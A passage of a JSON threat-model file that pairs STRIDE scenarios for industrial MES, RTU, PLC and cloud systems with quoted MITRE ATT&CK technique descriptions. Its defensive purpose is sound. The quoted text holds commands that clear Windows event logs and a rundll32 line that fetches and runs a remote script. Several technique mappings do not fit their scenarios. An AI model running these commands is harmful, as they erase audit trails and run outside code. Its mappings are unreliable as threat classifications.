                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker captures and reuses session tokens to hijack active sessions in cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Session tokens are not expired or invalidated immediately.",
                    "Role": "System Administrator",
                    "Condition": "Tokens have a long expiration time."
                },
                {
                    "Assumption": "Network traffic is susceptible to eavesdropping.",
                    "Role": "Network Admin",
                    "Condition": "Encryption is weak or not properly implemented."
                },
                {
                    "Assumption": "Reuse of session tokens is not adequately checked.",
                    "Role": "Application Developer",
                    "Condition": "System lacks mechanisms to detect token reuse."
                }
            ],
            "Potential Impact": "Unauthorized data access, potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "session hijacking",
                "token",
                "credential access",
                "cloud"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake field device to communicate with RTUs, injecting false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are not authenticated before communication.",
                    "Role": "System Architect",
                    "Condition": "Device authentication is not enforced."
                },
                {
                    "Assumption": "No device whitelisting is being used.",
                    "Role": "Security Admin",
                    "Condition": "All devices can connect without verification."
                },
                {
                    "Assumption": "Network can be accessed by unauthorized devices.",
                    "Role": "Network Admin",
                    "Condition": "Physical or network security is weak."
                }
            ],
            "Potential Impact": "Data integrity compromised, operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "injection",
                "integrity",
                "RTU"
            ],
            "mitre_technique": {
                "name": "DNS",
                "description": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--0ff59227-8aa8-4c09-bf1f-925605bd07ea",
                "technique_id": "T1590.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies configuration files on the Control Center servers to alter system behavior.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the file system.",
                    "Role": "Attacker",
                    "Condition": "File access permissions are lax."
                },
                {
                    "Assumption": "Configuration files are not integrity-checked.",
                    "Role": "System Admin",
                    "Condition": "No checksums or integrity validation mechanisms."
                },
                {
                    "Assumption": "No proper logging of file changes.",
                    "Role": "IT Staff",
                    "Condition": "Changes are not logged or monitored."
                }
            ],
            "Potential Impact": "Compromised system integrity, potential unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "file system",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data packets between RTUs and the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network Admin",
                    "Condition": "Encryption is weak or non-existent."
                },
                {
                    "Assumption": "Network perimeter is not secure.",
                    "Role": "IT Security Staff",
                    "Condition": "No adequate intrusion prevention systems (IPS)."
                },
                {
                    "Assumption": "Packet tampering is not detected.",
                    "Role": "System Admin",
                    "Condition": "No real-time packet inspection or anomaly detection."
                }
            ],
            "Potential Impact": "Data integrity and availability are compromised, operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "packet manipulation",
                "RTU",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker changes the firmware on a PLC to alter its operations.",
            "Assumptions": [
                {
                    "Assumption": "Firmware is not digitally signed.",
                    "Role": "Device Manufacturer",
                    "Condition": "No signature checks during firmware updates."
                },
                {
                    "Assumption": "Physical security of device is weak.",
                    "Role": "System Admin",
                    "Condition": "Devices are accessible to unauthorized personnel."
                },
                {
                    "Assumption": "Firmware updates are not monitored or logged.",
                    "Role": "IT Security Staff",
                    "Condition": "No activity logging for firmware updates."
                }
            ],
            "Potential Impact": "Compromised device integrity, potential operational malfunctions.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "PLC",
                "device integrity",
                "manufacturing"
            ],
            "mitre_technique": {
                "name": "Program Upload",
                "description": "Adversaries may attempt to upload a program from a PLC to gather information about an industrial process. Uploading a program may allow them to acquire and study the underlying logic. Methods of program upload include vendor software, which enables the user to upload and read a program running on a PLC. This software can be used to upload the target program to a workstation, jump box, or an interfacing device.",
                "id": "attack-pattern--3067b85e-271e-4bc5-81ad-ab1a81d411e3",
                "technique_id": "T0845"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny issuing commands or making changes in the MES database.",
            "Assumptions": [
                {
                    "Assumption": "No proper logging of user activities.",
                    "Role": "System Admin",
                    "Condition": "Logs are incomplete or not maintained."
                },
                {
                    "Assumption": "User actions are not time-stamped or signed.",
                    "Role": "Security Architect",
                    "Condition": "System lacks audit trails."
                },
                {
                    "Assumption": "User authentication is weak.",
                    "Role": "IT Security Team",
                    "Condition": "Systems are accessed without strong authentication mechanisms."
                }
            ],
            "Potential Impact": "Challenges in tracking changes, potential disputes over unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "database",
                "MES"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Administrators deny modifying access permissions on cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Administrative actions are not logged.",
                    "Role": "IT Security Staff",
                    "Condition": "Admin actions logs are missing or incomplete."
                },
                {
                    "Assumption": "Changes are not monitored in real-time.",
                    "Role": "Monitoring Team",
                    "Condition": "Lack of real-time alerts for configuration changes."
                },
                {
                    "Assumption": "Access control lacks accountability.",
                    "Role": "System Architect",
                    "Condition": "No user-specific action tracking."
                }
            ],
            "Potential Impact": "Difficult to trace irresponsible changes, increased risk of unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "access control",
                "cloud services",
                "logging"
            ],
            "mitre_technique": {
                "name": "Rogue Domain Controller",
                "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                "id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
                "technique_id": "T1207"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Operators deny initiating certain control commands in the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Control commands are not logged with user details.",
                    "Role": "System Admin",
                    "Condition": "No user identification in logs."
                },
                {
                    "Assumption": "Command issuance lacks non-repudiation.",
                    "Role": "Security Architect",
                    "Condition": "No digital signatures or secure logs."
                },
                {
                    "Assumption": "System lacks strong authentication for command initiation.",
                    "Role": "IT Security Team",
                    "Condition": "Commands can be issued without robust authentication."
                }
            ],
            "Potential Impact": "Operational integrity issues and disputes over system usage.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "control commands",
                "logging",
                "control center"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data is leaked from the MES database.",
            "Assumptions": [
                {
                    "Assumption": "Database access is not restricted.",
                    "Role": "Database Admin",
                    "Condition": "Lack of strict access controls."
                },
                {
                    "Assumption": "Data is not encrypted at rest.",
                    "Role": "Database Designer",
                    "Condition": "Sensitive data stored in plaintext."
                },
                {
                    "Assumption": "Weak network security around the database.",
                    "Role": "Network Admin",
                    "Condition": "Inadequate network segmentation and firewalls."
                }
            ],
            "Potential Impact": "Compromise of sensitive manufacturing data, potential competitive disadvantage.",
            "MITRE ATT&CK Keywords": [
                "data leak",
                "information disclosure",
                "MES",
                "database"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unencrypted communications between RTUs and the Control Center are intercepted.",
            "Assumptions": [
                {
                    "Assumption": "No encryption is used for data transmission.",
                    "Role": "Network Engineer",
                    "Condition": "Communications are sent in plaintext."
                },
                {
                    "Assumption": "Network perimeter is not secure.",
                    "Role": "IT Security Staff",
                    "Condition": "Weak network defenses and intrusion detection."
                },
                {
                    "Assumption": "An attacker has access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "Public or poorly protected network segments."
                }
            ],
            "Potential Impact": "Leakage of sensitive operational data, exposing system commands and configurations.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "communications",
                "information disclosure",
                "RTU"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker gains unauthorized access to the cloud where sensitive data is stored.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage lacks proper access controls.",
                    "Role": "Cloud Admin",
                    "Condition": "Misconfigured or weak access policies."
                },
                {
                    "Assumption": "Sensitive data is not encrypted.",
                    "Role": "Cloud Architect",
                    "Condition": "Data stored in plaintext."
                },
                {
                    "Assumption": "No network security measures on cloud access.",
                    "Role": "IT Security Staff",
                    "Condition": "Weak firewall and monitoring configurations."
                }
            ],
            "Potential Impact": "Sensitive data leakage, potential severe business impact.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "unauthorized access",
                "data leak",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the Control Center network with traffic, causing a disruption in control command execution.",
            "Assumptions": [
                {
                    "Assumption": "Network not protected against flood attacks.",
                    "Role": "IT Security Staff",
                    "Condition": "No anti-DDoS mechanisms in place."
                },
                {
                    "Assumption": "Critical systems are on the same network as non-critical systems.",
                    "Role": "Network Architect",
                    "Condition": "No proper network segmentation."
                },
                {
                    "Assumption": "Network traffic is not monitored for anomalies.",
                    "Role": "Monitoring Team",
                    "Condition": "Lack of real-time network monitoring."
                }
            ],
            "Potential Impact": "Operational disruptions, potential catastrophic impacts on manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network flood",
                "Control Center",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disables communication links between the RTUs and field devices.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels lack redundancy.",
                    "Role": "System Architect",
                    "Condition": "Single-point-of-failure in communications."
                },
                {
                    "Assumption": "No monitoring of communication health.",
                    "Role": "IT Security Staff",
                    "Condition": "No real-time monitoring of link status."
                },
                {
                    "Assumption": "Devices can be accessed directly and commands can be intercepted.",
                    "Role": "Network Admin",
                    "Condition": "Weak network security measures."
                }
            ],
            "Potential Impact": "Operational disruptions, inability to execute control commands.",
            "MITRE ATT&CK Keywords": [
                "communication disruption",
                "RTU",
                "field devices",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker triggers a large number of invalid operations requests on cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not have request rate limiting.",
                    "Role": "Cloud Admin",
                    "Condition": "No rate limiting on operation requests."
                },
                {
                    "Assumption": "Monitoring for excessive request patterns is not implemented.",
                    "Role": "Monitoring Team",
                    "Condition": "Anomaly detection is absent."
                },
                {
                    "Assumption": "Authentication mechanisms do not prevent automated attacks.",
                    "Role": "Security Architect",
                    "Condition": "Insufficient bot detection during requests."
                }
            ],
            "Potential Impact": "Cloud service disruptions, affecting overall system performance.",
            "MITRE ATT&CK Keywords": [
                "cloud DDoS",
                "invalid requests",
                "service disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the MES application to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Systems are not patched regularly.",
                    "Role": "IT Security Staff",
                    "Condition": "Delay or neglect in applying security updates."
                },
                {
                    "Assumption": "Application vulnerabilities are unknown or not mitigated.",
                    "Role": "System Admin",
                    "Condition": "Lack of vulnerability scanning."
                },
                {
                    "Assumption": "Administrative accounts do not have limited scope or use multi-factor authentication.",
                    "Role": "Security Architect",
                    "Condition": "Weak or excessive administrative privileges."
                }
            ],
            "Potential Impact": "Complete control over MES, potential full system compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "administrative access",
                "MES"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access to the gateway through a known exploit.",
            "Assumptions": [
                {
